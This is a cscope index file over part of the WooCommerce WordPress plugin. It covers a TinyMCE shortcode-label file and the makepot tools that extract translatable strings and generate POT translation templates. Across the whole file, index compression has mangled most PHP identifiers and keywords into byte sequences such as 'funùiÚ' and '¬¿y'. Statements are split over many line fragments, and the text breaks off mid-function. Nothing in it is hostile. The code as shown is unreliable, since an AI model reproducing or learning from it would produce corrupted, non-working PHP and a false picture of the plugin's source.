cscope 15 $HOME/wordpress/wp-content/plugins/woocommerce               0001931808
	@assets/js/admin/editor_plugin_lang.php

1 <?
php


3 
	g$¡ršgs
 = 'tšyMCE.addI18n({' . 
_WP_Ed™Üs
::
$mû_loÿË
 . ':{

4 
woocomm”û
:{

5 
š£¹
: "' .ƒsc_js( __( 'Insert Shortcode', 'woocommerce' ) ) . '",

6 
´iû_bu‰Ú
: "' .ƒsc_js( __( 'Product…rice/cart button', 'woocommerce' ) ) . '",

7 
´oduù_by_sku
: "' .ƒsc_js( __( 'Product by SKU/ID', 'woocommerce' ) ) . '",

8 
´oduùs_by_sku
: "' .ƒsc_js( __( 'Products by SKU/ID', 'woocommerce' ) ) . '",

9 
´oduù_ÿ‹gÜ›s
: "' .ƒsc_js( __( 'Product categories', 'woocommerce' ) ) . '",

10 
´oduùs_by_ÿt_¦ug
: "' .ƒsc_js( __( 'Products by category slug', 'woocommerce' ) ) . '",

11 
»ûÁ_´oduùs
: "' .ƒsc_js( __( 'Recent…roducts', 'woocommerce' ) ) . '",

12 
ã©u»d_´oduùs
: "' .ƒsc_js( __( 'Featured…roducts', 'woocommerce' ) ) . '",

13 
shİ_mes§ges
: "' .ƒsc_js( __( 'Shop Messages', 'woocommerce' ) ) . '",

14 
Üd”_Œackšg
: "' .ƒsc_js( __( 'Orderracking', 'woocommerce' ) ) . '",

15 
my_accouÁ
: "' .ƒsc_js( __( 'My Account', 'woocommerce' ) ) . '",

16 
shİ_mes§ges_shÜtcode
: "' .ƒsc_jsĞ­¶y_f‹rsĞ"
shİ_mes§ges_shÜtcode_g
", 'woocommerce_shop_messages' ) ) . '",

17 
Üd”_Œackšg_shÜtcode
: "' .ƒsc_jsĞ­¶y_f‹rsĞ"
woocomm”û_Üd”_Œackšg_shÜtcode_g
", 'woocommerce_order_tracking' ) ) . '"

	@i18n/makepot/extract/extract.php

1 <?
php


2 
»quœe_Úû
 
dœÇme
Ğ
__FILE__
 ) . '/../pomo/entry.php';

3 
»quœe_Úû
 
dœÇme
Ğ
__FILE__
 ) . '/../pomo/translations.php';

5 şas 
	cSŒšgExŒaùÜ
 {

7 
v¬
 
	m$ruËs
 = 
¬¿y
();

8 
v¬
 
	m$comm’t_´efix
 = 'translators:';

10 
funùiÚ
 
__cÚ¡ruù
Ğ
$ruËs
 = 
	$¬¿y
() ) {

11 
$this
->
ruËs
 = 
$ruËs
;

14 
funùiÚ
 
	`exŒaù_äom_dœeùÜy
Ğ
$dœ
, 
$exşudes
 = 
	`¬¿y
(), 
$šşudes
 =‡¼ay(), 
$´efix
 = '' ) {

15 
$Şd_cwd
 = 
	`g‘cwd
();

16 
	`chdœ
Ğ
$dœ
 );

17 
$Œª¦©iÚs
 = 
Ãw
 
T¿n¦©iÚs
;

18 
$fe_Çmes
 = (
¬¿y
è
	`sÿndœ
( '.' );

19 
	`fÜ—ch
 ( 
$fe_Çmes
 
as
 
$fe_Çme
 ) {

20 iàĞ'.' =ğ
$fe_Çme
 || '..' == $file_name ) ;

21 iàĞ
	`´eg_m©ch
Ğ'/\.php$/', 
$fe_Çme
 ) && 
$this
->
	`dÛs_fe_Çme_m©ch
Ğ
$´efix
 . $fe_Çme, 
$exşudes
, 
$šşudes
 ) ) {

22 
$t
 = 
$this
->
	`exŒaù_äom_fe
Ğ
$fe_Çme
, 
$´efix
 );

23 
$Œª¦©iÚs
->
	`m”ge_Üigš®s_w™h
Ğ
$t
 );

25 iàĞ
	`is_dœ
Ğ
$fe_Çme
 ) ) {

26 
$t
 = 
$this
->
	`exŒaù_äom_dœeùÜy
Ğ
$fe_Çme
, 
$exşudes
, 
$šşudes
, 
$´efix
 . $file_name . '/' );

27 
$Œª¦©iÚs
->
	`m”ge_Üigš®s_w™h
Ğ
$t
 );

30 
	`chdœ
Ğ
$Şd_cwd
 );

31  
$Œª¦©iÚs
;

32 
	}
}

34 
funùiÚ
 
	$exŒaù_äom_fe
Ğ
$fe_Çme
, 
$´efix
 ) {

35 
$code
 = 
	`fe_g‘_cÚ‹Ás
Ğ
$fe_Çme
 );

36  
$this
->
	`exŒaù_’Œ›s
Ğ
$code
, 
$´efix
 . 
$fe_Çme
 );

37 
	}
}

39 
funùiÚ
 
	$dÛs_fe_Çme_m©ch
Ğ
$·th
, 
$exşudes
, 
$šşudes
 ) {

40 iàĞ
$šşudes
 ) {

41 
$m©ched_ªy_šşude
 = 
çl£
;

42 
	`fÜ—ch
Ğ
$šşudes
 
as
 
$šşude
 ) {

43 iàĞ
	`´eg_m©ch
Ğ'|^'.
$šşude
.'$|', 
$·th
 ) ) {

44 
$m©ched_ªy_šşude
 = 
Œue
;

48 iàĞ!
$m©ched_ªy_šşude
 )  
çl£
;

50 iàĞ
$exşudes
 ) {

51 
	`fÜ—ch
Ğ
$exşudes
 
as
 
$exşude
 ) {

52 iàĞ
	`´eg_m©ch
Ğ'|^'.
$exşude
.'$|', 
$·th
 ) ) {

53  
çl£
;

57  
Œue
;

58 
	}
}

60 
funùiÚ
 
	$’Œy_äom_ÿÎ
Ğ
$ÿÎ
, 
$fe_Çme
 ) {

61 
$ruË
 = 
	`is£t
Ğ
$this
->
ruËs
[
$ÿÎ
['Çme']] )? $this->ruËs[$ÿÎ['Çme']] : 
nuÎ
;

62 iàĞ!
$ruË
 )  
nuÎ
;

63 
$’Œy
 = 
Ãw
 
T¿n¦©iÚ_EÁry
;

64 
$muÉË
 = 
	`¬¿y
();

65 
$com¶‘e
 = 
çl£
;

66  
$i
 = 0; $˜< 
	`couÁ
Ğ
$ruË
 ); ++$i ) {

67 iàĞ
$ruË
[
$i
] && ( !
	`is£t
Ğ
$ÿÎ
['¬gs'][$i] ) || !
	`is_¡ršg
Ğ$ÿÎ['¬gs'][$i] ) || '' =ğ$ÿÎ['¬gs'][$i] ) )  
çl£
;

68  
$ruË
[
$i
] ) {

70 iàĞ
$com¶‘e
 ) {

71 
$muÉË
[] = 
$’Œy
;

72 
$’Œy
 = 
Ãw
 
T¿n¦©iÚ_EÁry
;

73 
$com¶‘e
 = 
çl£
;

75 
$’Œy
->
sšguÏr
 = 
$ÿÎ
['¬gs'][
$i
];

76 
$com¶‘e
 = 
Œue
;

79 iàĞ
$com¶‘e
 ) {

80 
$muÉË
[] = 
$’Œy
;

81 
$’Œy
 = 
Ãw
 
T¿n¦©iÚ_EÁry
;

82 
$com¶‘e
 = 
çl£
;

84 
$’Œy
->
sšguÏr
 = 
$ÿÎ
['¬gs'][
$i
];

85 
$’Œy
->
is_¶u¿l
 = 
Œue
;

88 
$’Œy
->
¶u¿l
 = 
$ÿÎ
['¬gs'][
$i
];

89 
$’Œy
->
is_¶u¿l
 = 
Œue
;

90 
$com¶‘e
 = 
Œue
;

93 
$’Œy
->
cÚ‹xt
 = 
$ÿÎ
['¬gs'][
$i
];

94 
	`fÜ—ch
Ğ
$muÉË
 
as
 &
$sšgË_’Œy
 ) {

95 
$sšgË_’Œy
->
cÚ‹xt
 = 
$’Œy
->context;

100 iàĞ
	`is£t
Ğ
$ÿÎ
['line'] ) && $call['line'] ) {

101 
$»ã»nûs
 = 
	`¬¿y
Ğ
$fe_Çme
 . ':' . 
$ÿÎ
['line'] );

102 
$’Œy
->
»ã»nûs
 = 
$»ã»nûs
;

103 
	`fÜ—ch
Ğ
$muÉË
 
as
 &
$sšgË_’Œy
 ) {

104 
$sšgË_’Œy
->
»ã»nûs
 = 
$»ã»nûs
;

107 iàĞ
	`is£t
Ğ
$ÿÎ
['comment'] ) && $call['comment'] ) {

108 
$comm’ts
 = 
	`¹rim
Ğ
$ÿÎ
['comment'] ) . "\n";

109 
$’Œy
->
exŒaùed_comm’ts
 = 
$comm’ts
;

110 
	`fÜ—ch
Ğ
$muÉË
 
as
 &
$sšgË_’Œy
 ) {

111 
$sšgË_’Œy
->
exŒaùed_comm’ts
 = 
$comm’ts
;

114 iàĞ
$muÉË
 && 
$’Œy
 ) {

115 
$muÉË
[] = 
$’Œy
;

116  
$muÉË
;

119  
$’Œy
;

120 
	}
}

122 
funùiÚ
 
	$exŒaù_’Œ›s
Ğ
$code
, 
$fe_Çme
 ) {

123 
$Œª¦©iÚs
 = 
Ãw
 
T¿n¦©iÚs
;

124 
$funùiÚ_ÿÎs
 = 
$this
->
	`fšd_funùiÚ_ÿÎs
Ğ
	`¬¿y_keys
Ğ$this->
ruËs
 ), 
$code
 );

125 
	`fÜ—ch
Ğ
$funùiÚ_ÿÎs
 
as
 
$ÿÎ
 ) {

126 
$’Œy
 = 
$this
->
	`’Œy_äom_ÿÎ
Ğ
$ÿÎ
, 
$fe_Çme
 );

127 iàĞ
	`is_¬¿y
Ğ
$’Œy
 ) )

128 
	`fÜ—ch
Ğ
$’Œy
 
as
 
$sšgË_’Œy
 )

129 
$Œª¦©iÚs
->
	`add_’Œy_Ü_m”ge
Ğ
$sšgË_’Œy
 );

130 
	`–£if
 ( 
$’Œy
)

131 
$Œª¦©iÚs
->
	`add_’Œy_Ü_m”ge
Ğ
$’Œy
 );

133  
$Œª¦©iÚs
;

134 
	}
}

142 
funùiÚ
 
	$fšd_funùiÚ_ÿÎs
Ğ
$funùiÚ_Çmes
, 
$code
 ) {

143 
$tok’s
 = 
	`tok’_g‘_®l
Ğ
$code
 );

144 
$funùiÚ_ÿÎs
 = 
	`¬¿y
();

145 
$Ï‹¡_comm’t
 = 
çl£
;

146 
$š_func
 = 
çl£
;

147 
	`fÜ—ch
Ğ
$tok’s
 
as
 
$tok’
 ) {

148 
$id
 = 
$‹xt
 = 
nuÎ
;

149 iàĞ
	`is_¬¿y
Ğ
$tok’
 ) ) 
	`li¡
Ğ
$id
, 
$‹xt
, 
$lše
 ) = $token;

150 iàĞ
T_WHITESPACE
 =ğ
$id
 ) ;

151 iàĞ
T_STRING
 =ğ
$id
 && 
	`š_¬¿y
Ğ
$‹xt
, 
$funùiÚ_Çmes
 ) && !
$š_func
 ) {

152 
$š_func
 = 
Œue
;

153 
$·»n_Ëv–
 = -1;

154 
$¬gs
 = 
	`¬¿y
();

155 
$func_Çme
 = 
$‹xt
;

156 
$func_lše
 = 
$lše
;

157 
$func_comm’t
 = 
$Ï‹¡_comm’t
? $latest_comment : '';

159 
$ju¡_gÙ_što_func
 = 
Œue
;

160 
$Ï‹¡_comm’t
 = 
çl£
;

163 iàĞ
T_COMMENT
 =ğ
$id
 ) {

164 
$‹xt
 = 
	`Œim
Ğ
	`´eg_»¶aû
( '%^/\*|//%', '',…reg_replace( '%\*/$%', '', $text ) ) );

165 iàĞ0 ==ğ
	`¡½os
Ğ
$‹xt
, 
$this
->
comm’t_´efix
 ) ) {

166 
$Ï‹¡_comm’t
 = 
$‹xt
;

169 iàĞ!
$š_func
 ) ;

170 iàĞ'(' =ğ
$tok’
 ) {

171 
$·»n_Ëv–
++;

172 iàĞ0 =ğ
$·»n_Ëv–
 ) {

173 
$ju¡_gÙ_što_func
 = 
çl£
;

174 
$cu¼’t_¬gum’t
 = 
nuÎ
;

175 
$cu¼’t_¬gum’t_is_ju¡_l™”®
 = 
Œue
;

179 iàĞ
$ju¡_gÙ_što_func
 ) {

181 
$š_func
 = 
çl£
;

182 
$ju¡_gÙ_što_func
 = 
çl£
;

184 iàĞ')' =ğ
$tok’
 ) {

185 iàĞ0 =ğ
$·»n_Ëv–
 ) {

186 
$š_func
 = 
çl£
;

187 
$¬gs
[] = 
$cu¼’t_¬gum’t
;

188 
$ÿÎ
 = 
	`¬¿y
Ğ'Çme' => 
$func_Çme
, '¬gs' => 
$¬gs
, 'lše' => 
$func_lše
 );

189 iàĞ
$func_comm’t
 ) 
$ÿÎ
['comment'] = $func_comment;

190 
$funùiÚ_ÿÎs
[] = 
$ÿÎ
;

192 
$·»n_Ëv–
--;

195 iàĞ',' =ğ
$tok’
 && 0 =ğ
$·»n_Ëv–
 ) {

196 
$¬gs
[] = 
$cu¼’t_¬gum’t
;

197 
$cu¼’t_¬gum’t
 = 
nuÎ
;

198 
$cu¼’t_¬gum’t_is_ju¡_l™”®
 = 
Œue
;

201 iàĞ
T_CONSTANT_ENCAPSED_STRING
 =ğ
$id
 && 
$cu¼’t_¬gum’t_is_ju¡_l™”®
 ) {

203 
	`ev®
('$cu¼’t_¬gum’ˆğ'.
$‹xt
.';' );

206 
$cu¼’t_¬gum’t_is_ju¡_l™”®
 = 
çl£
;

207 
$cu¼’t_¬gum’t
 = 
nuÎ
;

209  
$funùiÚ_ÿÎs
;

210 
	}
}

	@i18n/makepot/index.php

1 <?
php


14 
ex™
( 'Locked' );

16 
£t_šşude_·th
(
g‘_šşude_·th
(è. 
PATH_SEPARATOR
 . 
dœÇme
(
__FILE__
));

18 if(
is£t
(
$_SERVER
['SHELL'])){

19 
	g$is_sh–l
 = 
True
;

21 
	g$is_sh–l
 = 
F®£
;

25 
	g»quœe
 'makepot.php';

26 
	g$mak•Ù
 = 
Ãw
 
WC_Mak•Ù
;

29 iàĞ(
	$is£t
(
$_GET
è
ªd
 ! 
	`em±y
Ğ$_GET['g’”©e']è|| (
	`is£t
(
$¬gc
, 
$¬gv
) && $argc==2 && $argv[1]=="generate")) ) {

31 
$»suÉs
 = 
	`¬¿y
();

32 
	`fÜ—ch
 ( 
$mak•Ù
->
´ojeùs
 
as
 
$Çme
 => 
$´ojeù
 ) {

33 
$»suÉs
[ 
$Çme
 ] = 
$mak•Ù
->
	`g’”©e_pÙ
( $name );

35 
	}
}

38 
	g$pÙ_fes
 = 
¬¿y
();

39 
fÜ—ch
Ğ
$mak•Ù
->
´ojeùs
 
as
 
$Çme
 => 
$´ojeù
 ) {

40 
$pÙ_fes
[ 
$Çme
 ] = 
¬¿y
(

41 'fe' => 
$´ojeù
['file'],

42 'fe_exi¡s' => 
fe_exi¡s
Ğ
$´ojeù
['file'] ),

43 'is_»adabË' => 
is_»adabË
Ğ
$´ojeù
['file'] ),

44 'is_wr™abË' => 
is_wr™abË
Ğ
$´ojeù
['file'] ),

45 'femtime' => ( 
is_»adabË
Ğ
$´ojeù
['fe'] ) ) ? 
femtime
Ğ$´ojeù['fe'] ) : 
çl£
,

46 'fesize' => ( 
is_»adabË
Ğ
$´ojeù
['fe'] ) ) ? 
fesize
Ğ$´ojeù['fe'] ) : 
çl£
,

50 if(
	g$is_sh–l
) {

51 
´štf
("WooComm”û % POT G’”©Ü\n\n", 
$mak•Ù
->
woocomm”û_v”siÚ
());

52 iàĞ! 
em±y
Ğ
$»suÉs
 ) ) {

53 
fÜ—ch
 ( 
$»suÉs
 
as
 
$pÙ_fe
 => 
$sucûeded
 ) {

54 
´štf
(" * % %s\n", 
ba£Çme
Ğ
$pÙ_fes
[ 
$pÙ_fe
 ]['fe'] ), 
$sucûeded
 ? 'successfully generated' : 'could‚ot be generated');

56 
	gecho
 "\n";

58 
	gecho
 "Thisool will (re)generate‡nd overwritehe following WooCommerce POT-files:\n\n";

59 
fÜ—ch
 ( 
$pÙ_fes
 
as
 
$pÙ_fe
 ) {

60 
´štf
(" - %-30s\t[%swr™abË]\n", 
ba£Çme
Ğ
$pÙ_fe
['file'] ), $pot_file['is_writable'] ? "" : "not ");

61 
´štf
(" * P©h: %s\n", 
dœÇme
Ğ
$pÙ_fe
['file'] ) . '/');

62 
´štf
(" * Size: %s\n", 
$pÙ_fe
['fe_exi¡s'] ? 
numb”_fÜm©
( $pot_file['filesize'], 0 ) : '--');

63 
´štf
(" * La¡ upd©ed: %s\n", 
$pÙ_fe
['femtime'] ? @
d©e
( 'F jS Y H:i:s', $pot_file['filemtime'] ) : '--');

66 
´štf
("\nTo Generate POT-files‚ow you must„un:\n\n");

67 
´štf
("\h°% g’”©e\n\n", 
$¬gv
[0]);

70 <!
DOCTYPE
 
	ghtml
>

71 <
html
 
	gÏng
="en">

72 <
h—d
>

74 <
m‘a
 
ch¬£t
="utf-8">

75 <
t™Ë
>
WooComm”û
 
POT
 
G’”©Ü
</title>

76 <
¡yË
>

77 
html
 { 
fÚt
-
çmy
:
mÚo¥aû
; }

78 
	gul
 { 
	gm¬gš
-
	gbÙtom
:1e
m
; }

79 
ul
 
	gul
 { 
	g·ddšg
-
	gËá
:0; 
	gli¡
-
	g¡yË
:
nÚe
; 
	gcŞÜ
:#999; }

81 .
	gsucûss
 { 
	gcŞÜ
:
g»’
; }

82 .
	g”rÜ
 { 
	gcŞÜ
:
»d
; }

83 .
	gbu‰Ú
 { 
	gdi¥Ïy
:
šlše
-
block
; 
	g·ddšg
:0.5e
m
 1em; 
	gbackground
:#ddd; 
	gfÚt
-
	gweight
:
bŞd
; 
	gcŞÜ
:#000; 
	g‹xt
-
	gdecÜ©iÚ
:
nÚe
; }

84 .
	gbu‰Ú
:
hov”
 { 
background
:#ccc; }

85 .
	gbu‰Ú
.
	gdi§bËd
 { 
	gbackground
:#“e; 
	gcŞÜ
:#888; 
	gcursÜ
:; }

87 @-
	gwebk™
-
keyäames
 
	grÙ©e
 { 
	gäom
 { -webk™-
	gŒªsfÜm
:
rÙ©e
(0de
g
); } 
	gto
 { -webkit-transform:rotate(360deg); } }

88 @-
	gmoz
-
keyäames
 
	grÙ©e
 { 
	gäom
 { -moz-
	gŒªsfÜm
:
rÙ©e
(0de
g
); } 
	gto
 { -moz-transform:rotate(360deg); } }

89 @
keyäames
 
	grÙ©e
 { 
	gäom
 { 
	gŒªsfÜm
:
rÙ©e
(0de
g
); } 
	gto
 {ransform:rotate(360deg); } }

90 .
	g¥šÃr
 { 
	gdi¥Ïy
:
šlše
-
block
;

91 -
	gwebk™
-
	gªim©iÚ
:
rÙ©e
 0.4
s
 
lš—r
 
šfš™e
;

92 -
	gmoz
-
	gªim©iÚ
:
rÙ©e
 0.4
s
 
lš—r
 
šfš™e
;

93 
	gªim©iÚ
:
rÙ©e
 0.4
s
 
lš—r
 
šfš™e
;

95 </
	g¡yË
>

97 </
	gh—d
>

98 <
	gbody
>

100 <
	gh1
>
	gWooComm”û
 <?
php
 
echo
 
	g$mak•Ù
->
woocomm”û_v”siÚ
(è?> 
POT
 
	gG’”©Ü
</h1>

102 <?
php
 iàĞ! 
em±y
Ğ
$»suÉs
 ) ) { ?>

103 <
	gul
>

104 <?
php
 
fÜ—ch
 ( 
$»suÉs
 
as
 
$pÙ_fe
 => 
$sucûeded
 ) { ?>

105 <?
php
 iàĞ
$sucûeded
 ) { ?>

106 <
li
 
şass
="sucûss"><
¡rÚg
><?
php
 
echo
 
ba£Çme
Ğ
$pÙ_fes
[ 
$pÙ_fe
 ]['fe'] ) ?> 
sucûssfuÎy
 
g’”©ed
.</strong></li>

107 <?
php
 } { ?>

108 <
li
 
	gşass
="”rÜ"><
¡rÚg
><?
php
 
echo
 
ba£Çme
Ğ
$pÙ_fes
[ 
$pÙ_fe
 ]['fe'] ) ?> 
could
 
nÙ
 
be
 
g’”©ed
.</strong></li>

109 <?
php
 } ?>

110 <?
	gphp
 } ?>

111 </
	gul
>

112 <?
	gphp
 } ?>

114 <
	gp
>
This
 
toŞ
 
wl
 (
»
)
g’”©e
 
ªd
 
ov”wr™e
 
the
 
fŞlowšg
 
WooComm”û
 
	gPOT
-
	gfes
:</
p
>

116 <
ul
>

117 <?
php
 
fÜ—ch
 ( 
$pÙ_fes
 
as
 
$pÙ_fe
 ) { ?>

118 <
li
>

119 <
¡rÚg
><?
php
 
echo
 
ba£Çme
Ğ
$pÙ_fe
['file'] ) ?></strong>

120 <?
php
 iàĞ
$pÙ_fe
['is_writable'] ) { ?>

121 <
¡rÚg
 
şass
="sucûss">[
wr™abË
]</strong>

122 <?
php
 } { ?>

123 <
¡rÚg
 
şass
="”rÜ">[
nÙ
 
wr™abË
]</strong>

124 <?
php
 } ?>

125 <
ul
>

126 <
li
>
P©h
: <?
php
 
echo
 
dœÇme
Ğ
$pÙ_fe
['file'] ) . '/' ?></li>

127 <
li
>
Size
: <?
php
 
echo
 ( 
$pÙ_fe
['fe_exi¡s'] ) ? 
numb”_fÜm©
( $pot_file['filesize'], 0 ) . ' bytes' : '--' ?></li>

128 <
li
>
La¡
 
upd©ed
: <?
php
 
echo
 ( 
$pÙ_fe
['femtime'] ) ? @
d©e
( 'F jS Y H:i:s', $pot_file['filemtime'] ) : '--' ?></li>

129 </
ul
>

130 </
li
>

131 <?
php
 } ?>

132 </
ul
>

134 <
p
>

135 <
a
 
id
="subm™" 
şass
="bu‰Ú" 
h»f
="?g’”©e=1">
G’”©e
 
POT
-
fes
 
now
</a>

136 </
p
>

138 <
süt
>

140 
docum’t
.
g‘EËm’tById
('subm™').
Úşick
 = 
funùiÚ
 () {

141 
this
.
şassName
 += ' disabled';

142 
	gthis
.
	gšÃrHTML
 = 'Generating POT-files <span class="spinner">/</span>';

144 </
	gsüt
>

146 </
	gbody
>

147 </
	ghtml
>

148 <?
	gphp
 } ?>

	@i18n/makepot/makepot.php

1 <?
php


13 şas 
	cWC_Mak•Ù
 {

18 
public
 
	m$woocomm”û_·th
;

23 
public
 
	m$´ojeùs
;

28 
public
 
	m$exŒaùÜ
;

33 
public
 
	m$ruËs
 = 
¬¿y
(

34 '_' => 
¬¿y
( 'string' ),

35 '__' => 
¬¿y
( 'string' ),

36 '_e' => 
¬¿y
( 'string' ),

37 '_c' => 
¬¿y
( 'string' ),

38 '_n' => 
¬¿y
( 'singular', 'plural' ),

39 '_n_noİ' => 
¬¿y
( 'singular', 'plural' ),

40 '_nc' => 
¬¿y
( 'singular', 'plural' ),

41 '__ng‘‹xt' => 
¬¿y
( 'singular', 'plural' ),

42 '__ng‘‹xt_noİ' => 
¬¿y
( 'singular', 'plural' ),

43 '_x' => 
¬¿y
( 'string', 'context' ),

44 '_ex' => 
¬¿y
( 'string', 'context' ),

45 '_nx' => 
¬¿y
Ğ'sšguÏr', '¶u¿l', 
nuÎ
, 'context' ),

46 '_nx_noİ' => 
¬¿y
( 'singular', 'plural', 'context' ),

47 '_n_js' => 
¬¿y
( 'singular', 'plural' ),

48 '_nx_js' => 
¬¿y
( 'singular', 'plural', 'context' ),

49 'esc_©Œ__' => 
¬¿y
( 'string' ),

50 'esc_html__' => 
¬¿y
( 'string' ),

51 'esc_©Œ_e' => 
¬¿y
( 'string' ),

52 'esc_html_e' => 
¬¿y
( 'string' ),

53 'esc_©Œ_x' => 
¬¿y
( 'string', 'context' ),

54 'esc_html_x' => 
¬¿y
( 'string', 'context' ),

63 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

65 
$this
->
	`£t_woocomm”û_·th
Ğ
	`dœÇme
(
__FILE__
) . '/../..' );

68 
$this
->
´ojeùs
 = 
	`¬¿y
(

69 'woocomm”û' => 
	`¬¿y
(

71 'fe' => 
$this
->
woocomm”û_·th
 . 'i18n/languages/woocommerce.pot',

72 'exşudes' => 
	`¬¿y
( 'includes/admin/.*' ),

73 'šşudes' => 
	`¬¿y
(),

75 'woocomm”û-admš' => 
	`¬¿y
(

77 'fe' => 
$this
->
woocomm”û_·th
 . 'i18n/languages/woocommerce-admin.pot',

78 'exşudes' => 
	`¬¿y
(),

79 'šşudes' => 
	`¬¿y
( 'includes/admin/.*' ),

84 
	`”rÜ_»pÜtšg
(
E_ALL
);

87 
»quœe_Úû
 'not-gettexted.php';

88 
»quœe_Úû
 'pot-ext-meta.php';

89 
»quœe_Úû
 'extract/extract.php';

90 
$this
->
exŒaùÜ
 = 
Ãw
 
	`SŒšgExŒaùÜ
Ğ$this->
ruËs
 );

99 
public
 
funùiÚ
 
	$£t_woocomm”û_·th
Ğ
$·th
 ) {

100 
$this
->
woocomm”û_·th
 = 
	`»®·th
Ğ
$·th
 ) . '/';

101 
	}
}

109 
public
 
funùiÚ
 
g’”©e_pÙ
Ğ
$´ojeù
 = 'woocommerce' ) {

111 iàĞ
em±y
Ğ
$this
->
´ojeùs
[ 
$´ojeù
 ] ) )

112  
çl£
;

115 
	g$cÚfig
 = 
$this
->
´ojeùs
[ 
$´ojeù
 ];

118 
	g$Üigš®s
 = 
$this
->
exŒaùÜ
->
exŒaù_äom_dœeùÜy
Ğ$this->
woocomm”û_·th
, 
$cÚfig
['excludes'], $config['includes'] );

121 
	g$pÙ
 = 
Ãw
 
PO
;

122 
	g$pÙ
->
	g’Œ›s
 = 
$Üigš®s
->
’Œ›s
;

123 
	g$pÙ
->
£t_h—d”
Ğ'Projeù-Id-V”siÚ', 'WooComm”û ' . 
$this
->
woocomm”û_v”siÚ
(è. ' ' . 
$cÚfig
['title'] );

124 
	g$pÙ
->
£t_h—d”
( 'Report-Msgid-Bugs-To', 'https://github.com/woothemes/woocommerce/issues' );

125 
	g$pÙ
->
£t_h—d”
Ğ'POT-C»©iÚ-D©e', 
gmd©e
( 'Y-m-d H:i:s+00:00' ) );

126 
	g$pÙ
->
£t_h—d”
( 'MIME-Version', '1.0' );

127 
	g$pÙ
->
£t_h—d”
( 'Content-Type', 'text/plain; charset=UTF-8' );

128 
	g$pÙ
->
£t_h—d”
( 'Content-Transfer-Encoding', '8bit' );

129 
	g$pÙ
->
£t_h—d”
Ğ'PO-RevisiÚ-D©e', 
gmd©e
( 'Y' ) . '-MO-DA HO:MI+ZONE' );

130 
	g$pÙ
->
£t_h—d”
( 'Last-Translator', 'FULL NAME <EMAIL@ADDRESS>' );

131 
	g$pÙ
->
£t_h—d”
( 'Language-Team', 'LANGUAGE <EMAIL@ADDRESS>' );

134 
	g$»suÉ
 = 
$pÙ
->
expÜt_to_fe
Ğ
$cÚfig
['file'] );

137 iàĞ
	g$´ojeù
 == 'woocommerce' ) {

138 
$pÙextm‘a
 = 
Ãw
 
PÙExtM‘a
;

139 
	g$pÙextm‘a
->
­³nd
Ğ
$this
->
woocomm”û_·th
 . 'woocomm”û.php', 
$cÚfig
['file'] );

142  
	g$»suÉ
;

151 
public
 
funùiÚ
 
	$woocomm”û_v”siÚ
() {

153 
$v”siÚ
;

154 iàĞ
nuÎ
 !=ğ
$v”siÚ
 )

155  
$v”siÚ
;

158 
$fe
 = 
$this
->
woocomm”û_·th
 . 'woocommerce.php';

160 iàĞ
	`is_»adabË
Ğ
$fe
 ) && 
	`´eg_m©ch
Ğ'/\bV”siÚ:\s*+(\S+)/i', 
	`fe_g‘_cÚ‹Ás
Ğ$f), 
$m©ches
 ) )

161 
$v”siÚ
 = 
$m©ches
[1];

163 
$v”siÚ
 = 
çl£
;

165  
$v”siÚ
;

166 
	}
}

176 
public
 
funùiÚ
 
	$g‘_fœ¡_lšes
(
$f’ame
, 
$lšes
 = 30) {

177 
$extf
 = 
	`fİ’
(
$f’ame
, 'r');

178 ià(!
$extf
è 
çl£
;

179 
$fœ¡_lšes
 = '';

180 
	`fÜ—ch
(
	`¿nge
(1, 
$lšes
è
as
 
$x
) {

181 
$lše
 = 
	`fg‘s
(
$extf
);

182 ià(
	`ãof
(
$extf
)) ;

183 ià(
çl£
 ==ğ
$lše
) {

184  
çl£
;

186 
$fœ¡_lšes
 .ğ
$lše
;

188  
$fœ¡_lšes
;

189 
	}
}

199 
public
 
funùiÚ
 
	$g‘_addÚ_h—d”
(
$h—d”
, &
$sourû
) {

200 ià(
	`´eg_m©ch
('|'.
$h—d”
.':(.*)$|mi', 
$sourû
, 
$m©ches
))

201  
	`Œim
(
$m©ches
[1]);

203  
çl£
;

204 
	}
}

	@i18n/makepot/not-gettexted.php

1 <?
php


12 iàĞ! 
defšed
('T_ML_COMMENT') )

13 
defše
('T_ML_COMMENT', 
T_COMMENT
);

15 
defše
('T_DOC_COMMENT', 
T_ML_COMMENT
);

17 
»quœe_Úû
 
dœÇme
Ğ
__FILE__
 ) . '/pomo/po.php';

18 
»quœe_Úû
 
dœÇme
Ğ
__FILE__
 ) . '/pomo/mo.php';

20 şas 
	cNÙG‘‹x‹d
 {

21 
v¬
 
	m$’abË_loggšg
 = 
çl£
;

23 
v¬
 
	m$STAGE_OUTSIDE
 = 0;

24 
v¬
 
	m$STAGE_START_COMMENT
 = 1;

25 
v¬
 
	m$STAGE_WHITESPACE_BEFORE
 = 2;

26 
v¬
 
	m$STAGE_STRING
 = 3;

27 
v¬
 
	m$STAGE_WHITESPACE_AFTER
 = 4;

28 
v¬
 
	m$STAGE_END_COMMENT
 = 4;

30 
v¬
 
	m$commªds
 = 
¬¿y
('extract' => 'command_extract', 'replace' => 'command_replace' );

33 
funùiÚ
 
	$logmsg
() {

34 
$¬gs
 = 
	`func_g‘_¬gs
();

35 ià(
$this
->
’abË_loggšg
è
	`”rÜ_log
(
	`im¶ode
(' ', 
$¬gs
));

38 
funùiÚ
 
	$¡d”r
(
$msg
, 
$Æ
=
Œue
) {

39 
	`fwr™e
(
STDERR
, 
$msg
.(
$Æ
? "\n" : ""));

40 
	}
}

42 
funùiÚ
 
	$şi_d›
(
$msg
) {

43 
$this
->
	`¡d”r
(
$msg
);

44 
	`ex™
(1);

45 
	}
}

47 
funùiÚ
 
unchªged_tok’
(
$tok’
, 
$s
='') {

48  
is_¬¿y
(
$tok’
)? $token[1] : $token;

51 
funùiÚ
 
ignÜe_tok’
(
$tok’
, 
$s
='') {

55 
funùiÚ
 
	$li¡_php_fes
(
$dœ
) {

56 
$fes
 = 
	`¬¿y
();

57 
$™ems
 = 
	`sÿndœ
Ğ
$dœ
 );

58 
	`fÜ—ch
 ( (
¬¿y
è
$™ems
 
as
 
$™em
 ) {

59 
$fuÎ_™em
 = 
$dœ
 . '/' . 
$™em
;

60 ià('.' =ğ
$™em
 || '..' == $item)

62 ià('.php' =ğ
	`sub¡r
(
$™em
, -4))

63 
$fes
[] = 
$fuÎ_™em
;

64 ià(
	`is_dœ
(
$fuÎ_™em
))

65 
$fes
 +ğ
	`¬¿y_m”ge
($fes, 
NÙG‘‹x‹d
::
	`li¡_php_fes
(
$fuÎ_™em
, $files));

67  
$fes
;

68 
	}
}

71 
funùiÚ
 
	$make_¡ršg_agg»g©Ü
(
